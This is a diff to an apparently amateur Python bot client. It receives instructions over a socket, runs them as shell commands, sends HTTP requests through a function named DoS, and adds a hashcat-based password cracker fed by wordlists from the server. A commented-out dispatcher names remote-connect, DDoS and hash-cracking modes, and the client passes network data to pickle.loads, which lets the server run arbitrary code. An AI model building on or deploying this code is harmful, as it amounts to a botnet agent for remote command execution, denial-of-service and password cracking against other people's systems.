@@ -1,8 +1,10 @@
+from audioop import mul
 import socket
 import os
 import subprocess
 import shlex
 import requests
+import pickle
 
 
 def execute(cmd):
@@ -33,12 +35,19 @@ def execute(cmd):
         print(output)
         return output
 
-def DoS(headers="",url="http://httpbin.org/post",option='p'):
+def DoS(headers="",url="http://httpbin.org/post",option='p',cookies=""):
     if option == 'p':
-        r = requests.post(url,headers=headers)
+        r = requests.post(url,headers=headers,cookies=cookies)
     elif option == 'g':
         r = requests.get(url,headers=headers)
     print(r.text)
+
+def hashcracker(wordlist):
+    with open("wordlist.txt","w") as w:
+        w.seek(0)
+        for i in wordlist:
+            w.write(i + "\n")
+    execute("hashcat -a0 -m0 hash.txt wordlist.txt")
 
 def Handshake(socket):
     if os.path.exists("myInfo"):
@@ -74,10 +83,33 @@ def main():
         while response != 'terminate':
             response = server.recv(4096)
             print("Hello")
-            print(response.decode())
-            if response:
-                #print(execute(response.decode()))
+            data = b""
+            '''while True:
+                packet = server.recv(4096)
+                if not packet: break
+                data += packet
+                print(data)
+            x = pickle.loads(server.recv(8192))
+            print(x)
+            #Connect
+            if x[0]==1:
+                print(execute(x[1].decode()))
                 server.send(bytes(execute(response.decode()),'utf-8'))
+            #DDoS
+            elif x[0] == 2:
+                print("Doing DDoS stuff")
+            #Hashcracker
+            elif x[0] == 3:
+                pass'''
+            if response:
+                #Printing it once (unnecessary) This is connect ka code
+                '''print(execute(response.decode()))
+                server.send(bytes(execute(response.decode()),'utf-8'))'''
+                #Hashcracker ka code
+                myWord = pickle.loads(response)
+                print(myWord)
+                hashcracker(myWord)
+                
     DoS(option='g',url='http://httpbin.org/get')
     x = input(":")
 
